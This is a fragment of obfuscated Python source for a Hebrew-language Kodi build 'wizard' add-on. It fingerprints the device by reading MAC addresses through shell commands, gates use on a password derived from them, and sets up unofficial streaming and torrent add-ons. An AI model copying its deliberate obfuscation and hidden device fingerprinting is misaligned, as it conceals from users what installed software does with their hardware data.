				for OOOO0O0OO000O00O0 in O0OO0OO000000O0O0 :#line:1702
					O00OOOOOO000000OO =OOOO0O0OO000O00O0 [0 ]#line:1703
					if O00OOOOOO000000OO in "'\"":#line:1704
						if OOOO0O0OO000O00O0 .find ('='+O00OOOOOO000000OO ,OOOO0O0OO000O00O0 .find (O00OOOOOO000000OO ,1 ))>-1 :#line:1705
							OOOO0O0OO000O00O0 =OOOO0O0OO000O00O0 [:OOOO0O0OO000O00O0 .find ('='+O00OOOOOO000000OO ,OOOO0O0OO000O00O0 .find (O00OOOOOO000000OO ,1 ))]#line:1706
						if OOOO0O0OO000O00O0 .rfind (O00OOOOOO000000OO ,1 )>-1 :#line:1708
							OOOO0O0OO000O00O0 =OOOO0O0OO000O00O0 [1 :OOOO0O0OO000O00O0 .rfind (O00OOOOOO000000OO )]#line:1709
					else :#line:1710
						if OOOO0O0OO000O00O0 .find (" ")>0 :#line:1711
							OOOO0O0OO000O00O0 =OOOO0O0OO000O00O0 [:OOOO0O0OO000O00O0 .find (" ")]#line:1712
						elif OOOO0O0OO000O00O0 .find ("/")>0 :#line:1713
							OOOO0O0OO000O00O0 =OOOO0O0OO000O00O0 [:OOOO0O0OO000O00O0 .find ("/")]#line:1714
						elif OOOO0O0OO000O00O0 .find (">")>0 :#line:1715
							OOOO0O0OO000O00O0 =OOOO0O0OO000O00O0 [:OOOO0O0OO000O00O0 .find (">")]#line:1716
					OOOO0OO000OO0OOO0 .append (OOOO0O0OO000O00O0 .strip ())#line:1718
			OOO00OO00O0O0O00O =OOOO0OO000OO0OOO0 #line:1719
		else :#line:1720
			OOOO0OO000OO0OOO0 =[]#line:1721
			for O000OO0O0000OO0O0 in OOO00OO00O0O0O00O :#line:1722
				OOO0000O000O0OOOO =u"</"+name #line:1723
				OOOOOO00OOO0O000O =O0OOO0O00OOOOO0O0 .find (O000OO0O0000OO0O0 )#line:1725
				O0OOOOOO0O0O0OO0O =O0OOO0O00OOOOO0O0 .find (OOO0000O000O0OOOO ,OOOOOO00OOO0O000O )#line:1726
				O00O000O0OO000O0O =O0OOO0O00OOOOO0O0 .find ("<"+name ,OOOOOO00OOO0O000O +1 )#line:1727
				while O00O000O0OO000O0O <O0OOOOOO0O0O0OO0O and O00O000O0OO000O0O !=-1 :#line:1729
					OO0O00O0000O00O0O =O0OOO0O00OOOOO0O0 .find (OOO0000O000O0OOOO ,O0OOOOOO0O0O0OO0O +len (OOO0000O000O0OOOO ))#line:1730
					if OO0O00O0000O00O0O !=-1 :#line:1731
						O0OOOOOO0O0O0OO0O =OO0O00O0000O00O0O #line:1732
					O00O000O0OO000O0O =O0OOO0O00OOOOO0O0 .find ("<"+name ,O00O000O0OO000O0O +1 )#line:1733
				if OOOOOO00OOO0O000O ==-1 and O0OOOOOO0O0O0OO0O ==-1 :#line:1735
					O0O000OO000O0000O =u""#line:1736
				elif OOOOOO00OOO0O000O >-1 and O0OOOOOO0O0O0OO0O >-1 :#line:1737
					O0O000OO000O0000O =O0OOO0O00OOOOO0O0 [OOOOOO00OOO0O000O +len (O000OO0O0000OO0O0 ):O0OOOOOO0O0O0OO0O ]#line:1738
				elif O0OOOOOO0O0O0OO0O >-1 :#line:1739
					O0O000OO000O0000O =O0OOO0O00OOOOO0O0 [:O0OOOOOO0O0O0OO0O ]#line:1740
				elif OOOOOO00OOO0O000O >-1 :#line:1741
					O0O000OO000O0000O =O0OOO0O00OOOOO0O0 [OOOOOO00OOO0O000O +len (O000OO0O0000OO0O0 ):]#line:1742
				if ret :#line:1744
					OOO0000O000O0OOOO =O0OOO0O00OOOOO0O0 [O0OOOOOO0O0O0OO0O :O0OOO0O00OOOOO0O0 .find (">",O0OOO0O00OOOOO0O0 .find (OOO0000O000O0OOOO ))+1 ]#line:1745
					O0O000OO000O0000O =O000OO0O0000OO0O0 +O0O000OO000O0000O +OOO0000O000O0OOOO #line:1746
				O0OOO0O00OOOOO0O0 =O0OOO0O00OOOOO0O0 [O0OOO0O00OOOOO0O0 .find (O0O000OO000O0000O ,O0OOO0O00OOOOO0O0 .find (O000OO0O0000OO0O0 ))+len (O0O000OO000O0000O ):]#line:1748
				OOOO0OO000OO0OOO0 .append (O0O000OO000O0000O )#line:1749
			OOO00OO00O0O0O00O =OOOO0OO000OO0OOO0 #line:1750
		O0000O000O0O00O00 +=OOO00OO00O0O0O00O #line:1751
	return O0000O000O0O00O00 #line:1753
def addItem (OO0O0O0O000OO00O0 ,OO0OO0OOO000O0000 ,OO0OOOOOO00OO0OO0 ,O0O0O0O0O0OOOOOOO ,OOOOOOO0OOOOOO0OO ,description =None ):#line:1755
	if description ==None :description =''#line:1756
	description ='[COLOR white]'+description +'[/COLOR]'#line:1757
	OO00OO00OO000O000 =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0OO0OOO000O0000 )+"&mode="+str (OO0OOOOOO00OO0OO0 )+"&name="+urllib .quote_plus (OO0O0O0O000OO00O0 )+"&iconimage="+urllib .quote_plus (O0O0O0O0O0OOOOOOO )+"&fanart="+urllib .quote_plus (OOOOOOO0OOOOOO0OO )#line:1758
	OOO0OO00000OO00O0 =True #line:1759
	O0O0000OO00OOOO0O =xbmcgui .ListItem (OO0O0O0O000OO00O0 ,iconImage =O0O0O0O0O0OOOOOOO ,thumbnailImage =O0O0O0O0O0OOOOOOO )#line:1760
	O0O0000OO00OOOO0O .setInfo (type ="Video",infoLabels ={"Title":OO0O0O0O000OO00O0 ,"Plot":description })#line:1761
	O0O0000OO00OOOO0O .setProperty ("fanart_Image",OOOOOOO0OOOOOO0OO )#line:1762
	O0O0000OO00OOOO0O .setProperty ("icon_Image",O0O0O0O0O0OOOOOOO )#line:1763
	OOO0OO00000OO00O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00OO00OO000O000 ,listitem =O0O0000OO00OOOO0O ,isFolder =False )#line:1764
	return OOO0OO00000OO00O0 #line:1765
def get_params ():#line:1767
		O000O0O000O00O00O =[]#line:1768
		O0000OO0OO0OO000O =sys .argv [2 ]#line:1769
		if len (O0000OO0OO0OO000O )>=2 :#line:1770
				O0O0OO0000O000OOO =sys .argv [2 ]#line:1771
				OO0O0OO0000O0OOOO =O0O0OO0000O000OOO .replace ('?','')#line:1772
				if (O0O0OO0000O000OOO [len (O0O0OO0000O000OOO )-1 ]=='/'):#line:1773
						O0O0OO0000O000OOO =O0O0OO0000O000OOO [0 :len (O0O0OO0000O000OOO )-2 ]#line:1774
				O00O00O0OO0O00O00 =OO0O0OO0000O0OOOO .split ('&')#line:1775
				O000O0O000O00O00O ={}#line:1776
				for O0OOO00000000O000 in range (len (O00O00O0OO0O00O00 )):#line:1777
						O0O0OOO0OOO000000 ={}#line:1778
						O0O0OOO0OOO000000 =O00O00O0OO0O00O00 [O0OOO00000000O000 ].split ('=')#line:1779
						if (len (O0O0OOO0OOO000000 ))==2 :#line:1780
								O000O0O000O00O00O [O0O0OOO0OOO000000 [0 ]]=O0O0OOO0OOO000000 [1 ]#line:1781
		return O000O0O000O00O00O #line:1783
def decode (OOOO0O0O00OO000OO ,OOO00000OOO000O0O ):#line:1788
    import base64 #line:1789
    OOOOOOO0O0O000OOO =[]#line:1790
    if (len (OOOO0O0O00OO000OO ))!=4 :#line:1792
     return 10 #line:1793
    OOO00000OOO000O0O =base64 .urlsafe_b64decode (OOO00000OOO000O0O )#line:1794
    for OO00O00OO00OO0OO0 in range (len (OOO00000OOO000O0O )):#line:1796
        OO00OO000O0O00OO0 =OOOO0O0O00OO000OO [OO00O00OO00OO0OO0 %len (OOOO0O0O00OO000OO )]#line:1797
        O0OO00OOO0OOO0O00 =chr ((256 +ord (OOO00000OOO000O0O [OO00O00OO00OO0OO0 ])-ord (OO00OO000O0O00OO0 ))%256 )#line:1798
        OOOOOOO0O0O000OOO .append (O0OO00OOO0OOO0O00 )#line:1799
    return "".join (OOOOOOO0O0O000OOO )#line:1800
def tmdb_list (OOOO0O0000OO0O00O ):#line:1801
    O0OOO0O0O0000OOOO =decode ("7643",OOOO0O0000OO0O00O )#line:1804
    return int (O0OOO0O0O0000OOOO )#line:1807
def u_list (OO0OOOO0000O000O0 ):#line:1808
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1810
        from math import sqrt #line:1811
        O0O00O00O00O000OO =tmdb_list (TMDB_NEW_API )#line:1812
        O0OO00OO000OOO0O0 =str ((getHwAddr ('eth0'))*O0O00O00O00O000OO )#line:1814
        O00O00O0000000OO0 =int (O0OO00OO000OOO0O0 [1 ]+O0OO00OO000OOO0O0 [2 ]+O0OO00OO000OOO0O0 [5 ]+O0OO00OO000OOO0O0 [7 ])#line:1815
        O0OOOO0OOOO0O0OO0 =(ADDON .getSetting ("pass"))#line:1817
        O00O0O0OO00OOOOO0 =(str (round (sqrt ((O00O00O0000000OO0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1822
        if '.'in O00O0O0OO00OOOOO0 :#line:1824
         O00O0O0OO00OOOOO0 =(str (round (sqrt ((O00O00O0000000OO0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1825
        if O0OOOO0OOOO0O0OO0 ==O00O0O0OO00OOOOO0 :#line:1827
          OOOO000O0OOO0O0O0 =OO0OOOO0000O000O0 #line:1829
        else :#line:1831
           if STARTP2 ()and STARTP ()=='ok':#line:1832
             return OO0OOOO0000O000O0 #line:1835
           OOOO000O0OOO0O0O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1836
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1837
           sys .exit ()#line:1838
        return OOOO000O0OOO0O0O0 #line:1839
    else :#line:1840
        STARTP ()#line:1841
def disply_hwr ():#line:1845
   try :#line:1846
    OOOOOO0OOOOOOOO0O =tmdb_list (TMDB_NEW_API )#line:1847
    OO0OO00OO00000OOO =str ((getHwAddr ('eth0'))*OOOOOO0OOOOOOOO0O )#line:1848
    OO0O000000OOO0O00 =(OO0OO00OO00000OOO [1 ]+OO0OO00OO00000OOO [2 ]+OO0OO00OO00000OOO [5 ]+OO0OO00OO00000OOO [7 ])#line:1855
    O0OOOOOO00OO00OO0 =(ADDON .getSetting ("action"))#line:1856
    wiz .setS ('action',str (OO0O000000OOO0O00 ))#line:1858
   except :pass #line:1859
def disply_hwr2 ():#line:1860
   try :#line:1861
    O00OO0OOO00OOO0O0 =tmdb_list (TMDB_NEW_API )#line:1862
    O0000O0OO00OOOOOO =str ((getHwAddr ('eth0'))*O00OO0OOO00OOO0O0 )#line:1864
    OO0OOOOOOOOO00OOO =(O0000O0OO00OOOOOO [1 ]+O0000O0OO00OOOOOO [2 ]+O0000O0OO00OOOOOO [5 ]+O0000O0OO00OOOOOO [7 ])#line:1873
    O00O0O00O000OOOO0 =(ADDON .getSetting ("action"))#line:1874
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO0OOOOOOOOO00OOO )#line:1877
   except :pass #line:1878
def getHwAddr (OO0OO00000OO00O00 ):#line:1880
   import subprocess ,time #line:1881
   OO0O0OOOO0OO000O0 ='windows'#line:1882
   if xbmc .getCondVisibility ('system.platform.android'):#line:1883
       OO0O0OOOO0OO000O0 ='android'#line:1884
   if xbmc .getCondVisibility ('system.platform.android'):#line:1885
     O0O0OO00O0OOO0OOO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1886
     O0O0O0O00OOO0000O =re .compile ('link/ether (.+?) brd').findall (str (O0O0OO00O0OOO0OOO ))#line:1888
     OO00000000000O0OO =0 #line:1889
     for O0O000O0O000O0OO0 in O0O0O0O00OOO0000O :#line:1890
      if O0O0O0O00OOO0000O !='00:00:00:00:00:00':#line:1891
          O0O0O00000OO00O0O =O0O000O0O000O0OO0 #line:1892
          OO00000000000O0OO =OO00000000000O0OO +int (O0O0O00000OO00O0O .replace (':',''),16 )#line:1893
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1895
       O0O00O0O0OO0OOOO0 =0 #line:1896
       OO00000000000O0OO =0 #line:1897
       O0O00OOO0O00O0000 =[]#line:1898
       O0O0O00OO0O000OO0 =os .popen ("getmac").read ()#line:1899
       O0O0O00OO0O000OO0 =O0O0O00OO0O000OO0 .split ("\n")#line:1900
       for O000OO000O0O0OOOO in O0O0O00OO0O000OO0 :#line:1902
            OO00O0OOO00OOOO00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O000OO000O0O0OOOO ,re .I )#line:1903
            if OO00O0OOO00OOOO00 :#line:1904
                O0O0O0O00OOO0000O =OO00O0OOO00OOOO00 .group ().replace ('-',':')#line:1905
                O0O00OOO0O00O0000 .append (O0O0O0O00OOO0000O )#line:1906
                OO00000000000O0OO =OO00000000000O0OO +int (O0O0O0O00OOO0000O .replace (':',''),16 )#line:1909
   else :#line:1911
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1912
   try :#line:1929
    return OO00000000000O0OO #line:1930
   except :pass #line:1931
def getpass ():#line:1932
	disply_hwr2 ()#line:1934
def setpass ():#line:1935
    O00O00O0OOO00O0O0 =xbmcgui .Dialog ()#line:1936
    O0OOOO0OO00O0OOOO =''#line:1937
    O00OO0OOO0OO0O00O =xbmc .Keyboard (O0OOOO0OO00O0OOOO ,'הכנס סיסמה')#line:1939
    O00OO0OOO0OO0O00O .doModal ()#line:1940
    if O00OO0OOO0OO0O00O .isConfirmed ():#line:1941
           O00OO0OOO0OO0O00O =O00OO0OOO0OO0O00O .getText ()#line:1942
    wiz .setS ('pass',str (O00OO0OOO0OO0O00O ))#line:1943
def setuname ():#line:1944
    O0000OO000OOOOOO0 =''#line:1945
    O0O0O00O000OO000O =xbmc .Keyboard (O0000OO000OOOOOO0 ,'הכנס שם משתמש')#line:1946
    O0O0O00O000OO000O .doModal ()#line:1947
    if O0O0O00O000OO000O .isConfirmed ():#line:1948
           O0000OO000OOOOOO0 =O0O0O00O000OO000O .getText ()#line:1949
           wiz .setS ('user',str (O0000OO000OOOOOO0 ))#line:1950
def powerkodi ():#line:1951
    os ._exit (1 )#line:1952
def buffer1 ():#line:1954
	OO0OO0O000OO0O0OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1955
	O00OO00OOO0000OOO =xbmc .getInfoLabel ("System.Memory(total)")#line:1956
	O0OOOO000O00O0OO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1957
	OO00OO00O0O0000OO =re .sub ('[^0-9]','',O0OOOO000O00O0OO0 )#line:1958
	OO00OO00O0O0000OO =int (OO00OO00O0O0000OO )/3 #line:1959
	OO0O0OOOOO00O0OO0 =OO00OO00O0O0000OO *1024 *1024 #line:1960
	try :O0O00O0O000OO0000 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1961
	except :O0O00O0O000OO0000 =16 #line:1962
	O0000O0O0O0O0OO0O =DIALOG .yesno ('FREE MEMORY: '+str (O0OOOO000O00O0OO0 ),'Based on your free Memory your optimal buffersize is: '+str (OO00OO00O0O0000OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1965
	if O0000O0O0O0O0OO0O ==1 :#line:1966
		with open (OO0OO0O000OO0O0OO ,"w")as OOO00O00000O0O000 :#line:1967
			if O0O00O0O000OO0000 >=17 :OOO0OOOO00000OOOO =xml_data_advSettings_New (str (OO0O0OOOOO00O0OO0 ))#line:1968
			else :OOO0OOOO00000OOOO =xml_data_advSettings_old (str (OO0O0OOOOO00O0OO0 ))#line:1969
			OOO00O00000O0O000 .write (OOO0OOOO00000OOOO )#line:1971
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0OOOOO00O0OO0 ),'Please restart Kodi for settings to apply.','')#line:1972
	elif O0000O0O0O0O0OO0O ==0 :#line:1974
		OO0O0OOOOO00O0OO0 =_O0OO0O0OO000OO000 (default =str (OO0O0OOOOO00O0OO0 ),heading ="INPUT BUFFER SIZE")#line:1975
		with open (OO0OO0O000OO0O0OO ,"w")as OOO00O00000O0O000 :#line:1976
			if O0O00O0O000OO0000 >=17 :OOO0OOOO00000OOOO =xml_data_advSettings_New (str (OO0O0OOOOO00O0OO0 ))#line:1977
			else :OOO0OOOO00000OOOO =xml_data_advSettings_old (str (OO0O0OOOOO00O0OO0 ))#line:1978
			OOO00O00000O0O000 .write (OOO0OOOO00000OOOO )#line:1979
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0OOOOO00O0OO0 ),'Please restart Kodi for settings to apply.','')#line:1980
def xml_data_advSettings_old (OOO000OO000O00OO0 ):#line:1981
	O0O0OO0O00O00O000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO000OO000O00OO0 #line:1991
	return O0O0OO0O00O00O000 #line:1992
def xml_data_advSettings_New (OOO0OOO00OOOO0000 ):#line:1994
	OOO0O0O00O0OO0000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0OOO00OOOO0000 #line:2006
	return OOO0O0O00O0OO0000 #line:2007
def write_ADV_SETTINGS_XML (O0OOOOO0OOOOO00OO ):#line:2008
    if not os .path .exists (xml_file ):#line:2009
        with open (xml_file ,"w")as OOO00OOO000000OOO :#line:2010
            OOO00OOO000000OOO .write (xml_data )#line:2011
def _O0OO0O0OO000OO000 (default ="",heading ="",hidden =False ):#line:2012
    ""#line:2013
    O00O0O000O000O000 =xbmc .Keyboard (default ,heading ,hidden )#line:2014
    O00O0O000O000O000 .doModal ()#line:2015
    if (O00O0O000O000O000 .isConfirmed ()):#line:2016
        return unicode (O00O0O000O000O000 .getText (),"utf-8")#line:2017
    return default #line:2018
def index ():#line:2020
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2021
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2022
	if AUTOUPDATE =='Yes':#line:2023
		if wiz .workingURL (WIZARDFILE )==True :#line:2024
			O00O0OOOOOOO00OO0 =wiz .checkWizard ('version')#line:2025
			if O00O0OOOOOOO00OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00O0OOOOOOO00OO0 ),'wizardupdate',themeit =THEME2 )#line:2026
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2027
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2028
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2029
	if len (BUILDNAME )>0 :#line:2030
		OOOO00OO000OOOOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2031
		OOOOO0OOO00O00000 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2032
		if OOOO00OO000OOOOO0 >BUILDVERSION :OOOOO0OOO00O00000 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOOOO0OOO00O00000 ,OOOO00OO000OOOOO0 )#line:2033
		addDir (OOOOO0OOO00O00000 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2035
		try :#line:2037
		     OOOOOO000OO000O00 =wiz .themeCount (BUILDNAME )#line:2038
		except :#line:2039
		   OOOOOO000OO000O00 =False #line:2040
		if not OOOOOO000OO000O00 ==False :#line:2041
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2042
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2043
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2046
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2047
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2048
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2052
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2054
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2056
def morsetup ():#line:2058
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2059
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2061
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2062
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2067
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2071
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2072
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2082
	setView ('files','viewType')#line:2083
def morsetup2 ():#line:2084
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2085
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
def fastupdate ():#line:2096
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2097
def forcefastupdate ():#line:2099
			OOO0OO0O0OOO000O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2100
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0OO0O0OOO000O0 )#line:2101
def rdsetup ():#line:2105
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2106
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2107
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2110
def traktsetup ():#line:2113
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2114
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2115
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2116
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	setView ('files','viewType')#line:2121
def setautorealdebrid ():#line:2122
    from resources .libs import real_debrid #line:2123
    OO0O0000O00OO0OO0 =real_debrid .RealDebridFirst ()#line:2124
    OO0O0000O00OO0OO0 .auth ()#line:2125
def setrealdebrid ():#line:2127
    OO00OOO000O0OOO00 =(ADDON .getSetting ("auto_rd"))#line:2128
    if OO00OOO000O0OOO00 =='false':#line:2129
       ADDON .openSettings ()#line:2130
    else :#line:2131
        from resources .libs import real_debrid #line:2132
        O00000OOO000O00OO =real_debrid .RealDebrid ()#line:2133
        O00000OOO000O00OO .auth ()#line:2134
        rdon ()#line:2137
def resolveurlsetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2140
def urlresolversetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2142
def placentasetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2145
def reptiliasetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2147
def flixnetsetup ():#line:2148
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2149
def yodasetup ():#line:2150
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2151
def numberssetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2153
def uranussetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2155
def genesissetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2157
def net_tools (view =None ):#line:2159
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2160
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2161
	setView ('files','viewType')#line:2163
def speedMenu ():#line:2164
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2165
def viewIP ():#line:2166
	O0O00OO0O0OOO0O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2180
	O0O00OO0OO0OOOO0O =[];O00OO00OOOOOO0O00 =0 #line:2181
	for OO00O0O00OOO00000 in O0O00OO0O0OOO0O00 :#line:2182
		O00000OOO0O0OOOO0 =wiz .getInfo (OO00O0O00OOO00000 )#line:2183
		OOOOOOOOO0O00O0O0 =0 #line:2184
		while O00000OOO0O0OOOO0 =="Busy"and OOOOOOOOO0O00O0O0 <10 :#line:2185
			O00000OOO0O0OOOO0 =wiz .getInfo (OO00O0O00OOO00000 );OOOOOOOOO0O00O0O0 +=1 ;wiz .log ("%s sleep %s"%(OO00O0O00OOO00000 ,str (OOOOOOOOO0O00O0O0 )));xbmc .sleep (1000 )#line:2186
		O0O00OO0OO0OOOO0O .append (O00000OOO0O0OOOO0 )#line:2187
		O00OO00OOOOOO0O00 +=1 #line:2188
	O0OOO0O0OOO000OOO ,OO00O0O0O00O0000O ,OOO0OO0OO000000O0 =getIP ()#line:2189
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OO0OO0OOOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2190
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0OOO000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2191
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0O0O00O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2192
